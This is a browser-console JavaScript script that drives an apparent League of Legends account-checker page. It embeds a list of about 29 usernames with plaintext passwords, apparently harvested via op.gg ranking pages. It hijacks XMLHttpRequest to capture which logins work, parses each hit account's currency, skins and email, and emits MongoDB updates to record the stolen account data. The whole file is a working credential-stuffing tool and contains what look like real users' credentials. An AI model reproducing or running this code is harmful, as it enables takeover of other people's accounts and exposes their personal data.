(async () => {
  const copyToClipboard = (str) => {
    const el = document.createElement("textarea");
    el.value = str;
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
  };
  const list = document.getElementById("cclist");
  const server = document.getElementById("server");
  let accounts = [
    {
      UserName: "LunaspiriT",
      Password: "D74516EFD92B4C519790028eca157b7a",
      FromUrl: "https://euw.op.gg/ranking/level/page=178998",
    },
    {
      UserName: "Luxana98",
      Password: "luxana98",
    },
    {
      UserName: "erhphpdgpodfkh",
      Password: "erhphpdgpodfkh1",
      FromUrl: "https://las.op.gg/ranking/level/page=15960",
    },
    {
      UserName: "NaberMoruk41",
      Password: "nabermoruk41",
      FromUrl: "https://tr.op.gg/ranking/level/page=19454",
    },
    {
      UserName: "Merunix",
      Password: "Merunix123",
      FromUrl: "https://euw.op.gg/ranking/level/page=94962",
    },
    {
      UserName: "WolfBangBang",
      Password: "wolfbangbang123",
      FromUrl: "https://br.op.gg/ranking/level/page=29961",
    },
    {
      UserName: "xDeathForeverx",
      Password: "abc123",
      FromUrl: "https://lan.op.gg/ranking/level/page=16663",
    },
    {
      UserName: "Jiga1UP",
      Password: "jiga1up",
      FromUrl: "https://eune.op.gg/ranking/level/page=165201",
    },
    {
      UserName: "Darklordrox",
      Password: "darklordrox123",
      FromUrl: "https://oce.op.gg/ranking/level/page=6491",
    },
    {
      UserName: "NymphomaNN",
      Password: "nymphomann1",
      FromUrl: "https://tr.op.gg/ranking/level/page=19437",
    },
    {
      UserName: "Dragox7172",
      Password: "dragox7172",
      FromUrl: "https://las.op.gg/ranking/level/page=15444",
    },
    {
      UserName: "WaffleCream",
      Password: "wafflecream1",
      FromUrl: "https://oce.op.gg/ranking/level/page=6471",
    },
    {
      UserName: "Tatane123",
      Password: "tatane123",
      FromUrl: "https://euw.op.gg/ranking/level/page=94428",
    },
    {
      UserName: "Espejo64",
      Password: "espejo64",
      FromUrl: "https://lan.op.gg/ranking/level/page=16128",
    },
    {
      UserName: "Brancisco",
      Password: "brancisco1",
      FromUrl: "https://oce.op.gg/ranking/level/page=6470",
    },
    {
      UserName: "picpick",
      Password: "picpick123",
      FromUrl: "https://www.op.gg/ranking/level/page=82928",
    },
    {
      UserName: "kelin1115",
      Password: "kelin1115",
      FromUrl: "https://ru.op.gg/ranking/level/page=17220",
    },
    {
      UserName: "PabloATR",
      Password: "pabloatr123",
      FromUrl: "https://las.op.gg/ranking/level/page=15434",
    },
    {
      UserName: "cataphyllary71",
      Password: "abc123",
      FromUrl: "https://na.op.gg/ranking/level/page=65911",
    },
    {
      UserName: "Hermes123456",
      Password: "hermes123456",
      FromUrl: "https://las.op.gg/ranking/level/page=15418",
    },
    {
      UserName: "Daidon",
      Password: "abc123",
      FromUrl: "https://br.op.gg/ranking/level/page=29404",
    },
    {
      UserName: "darkfire879",
      Password: "darkfire879",
      FromUrl: "https://las.op.gg/ranking/level/page=15403",
    },
    {
      UserName: "temo1010",
      Password: "temo1010",
      FromUrl: "https://ru.op.gg/ranking/level/page=17195",
    },
    {
      UserName: "miticomitico",
      Password: "miticomitico123",
      FromUrl: "https://br.op.gg/ranking/level/page=29391",
    },
    {
      UserName: "Martin080901",
      Password: "Martin080901",
      FromUrl: "https://euw.op.gg/ranking/level/page=94386",
    },
    {
      UserName: "DemonSnake1",
      Password: "demonsnake1",
      FromUrl: "https://las.op.gg/ranking/level/page=15407",
    },
    {
      UserName: "vanminh2016",
      Password: "vanminh2016",
      FromUrl: "https://jp.op.gg/ranking/level/page=14281",
    },
    {
      UserName: "Emiratiyah",
      Password: "emiratiyah123",
      FromUrl: "https://oce.op.gg/ranking/level/page=6425",
    },
    {
      UserName: "SneakyWizZi",
      Password: "sneakywizzi1",
      FromUrl: "https://jp.op.gg/ranking/level/page=14281",
    },
  ];
  const serverMapper = {
    "1": (url) => (url || "").startsWith("https://br.op.gg"),
    "2": (url) => (url || "").startsWith("https://eune.op.gg"),
    "3": (url) => (url || "").startsWith("https://euw.op.gg"),
    "4": (url) => (url || "").startsWith("https://jp.op.gg"),
    "5": (url) => (url || "").startsWith("https://www.op.gg"),
    "6": (url) => (url || "").startsWith("https://lan.op.gg"),
    "7": (url) => (url || "").startsWith("https://las.op.gg"),
    "8": (url) => (url || "").startsWith("https://na.op.gg"),
    "9": (url) => (url || "").startsWith("https://oce.op.gg"),
    "11": (url) => (url || "").startsWith("https://ru.op.gg"),
    "12": (url) => (url || "").startsWith("https://tr.op.gg"),
    GetAccounts() {
      const keys = Object.keys(this);
      const accs = {};
      for (let i = 0; i < keys.length; i += 1) {
        if (isNaN(+keys[i])) continue;
        for (let ii = 0; ii < accounts.length; ii += 1) {
          if (this[keys[i]](accounts[ii].FromUrl)) {
            if (!accs[keys[i]]) accs[keys[i]] = [];
            accs[keys[i]].push(accounts[ii]);
          }
        }
      }
      return accs;
    },
  };
  accounts = serverMapper.GetAccounts();
  const keys = Object.keys(accounts);
  let currKey = -1;
  let updates = [];
  const getUpdate = (data) =>
    updates
      .map(
        (update) =>
          `db.Accounts.updateOne(${JSON.stringify(
            update.where
          )}, ${JSON.stringify(update.set)})`
      )
      .join(";\n");

  const oldXHR = window.XMLHttpRequest;
  function newXHR() {
    var realXHR = new oldXHR();
    realXHR.addEventListener(
      "readystatechange",
      function () {
        if (realXHR.readyState !== realXHR.DONE) return;
        try {
          if (realXHR.status < 200 || realXHR.status > 299)
            throw new Error("Not 200");
          const body = JSON.parse(realXHR.response);
          console.log(body);
          if (body.sonuc !== "canli") return;
          const table = document.createElement("table");
          table.innerHTML = body.icerik;
          const trs = table.getElementsByTagName("tr");
          for (let i = 0; i < trs.length; i += 1) {
            const tr = trs[i];
            const [, userData, capture] = tr.getElementsByTagName("td");
            const [UserName] = userData.innerHTML.split(":");
            let [
              RP,
              BlueEssence,
              Level,
              RefundsRemaining,
              TotalChamps,
              TotalSkins,
              Email,
              EmailVerified,
            ] = capture.innerHTML.split("<br>");
            updates.push({
              where: { UserName },
              set: {
                $set: {
                  Level: +Level.split(":")[1].trim() || 0,
                  RP: +RP.split(":")[1].trim() || 0,
                  BlueEssence: +BlueEssence.split(":")[1].trim() || 0,
                  RefundsRemaining: +RefundsRemaining.split(":")[1].trim() || 0,
                  TotalChamps: +TotalChamps.split(":")[1].trim() || 0,
                  TotalSkins: +TotalSkins.split(":")[1].trim() || 0,
                  Email: Email.split(":")[1].trim() || "",
                  EmailVerified:
                    EmailVerified.split(":")[1].trim() === "Verified",
                },
              },
            });
            console.log(updates);
            console.clear();
            console.log(getUpdate(updates));
          }
        } catch (e) {}
      },
      false
    );
    return realXHR;
  }
  window.XMLHttpRequest = newXHR;

  // console.clear();
  function startQuery(accs) {
    if (!accs) return;
    const submit = document.getElementById("submit");
    let comboText = "";
    for (let i = 0; i < accs.length; i += 1) {
      if (i !== 0) comboText += "\n";
      comboText += accs[i].UserName + ":" + accs[i].Password;
    }
    list.value = comboText;
    server.value = keys[currKey];
    submit.click();
  }
  const start = () => {
    currKey += 1;
    updates = [];
    startQuery(accounts[keys[currKey]]);
  };
  // setTimeout(start, 1500);
  console.clear();
  console.log("accounts", accounts);
  list.addEventListener("click", start);
})();
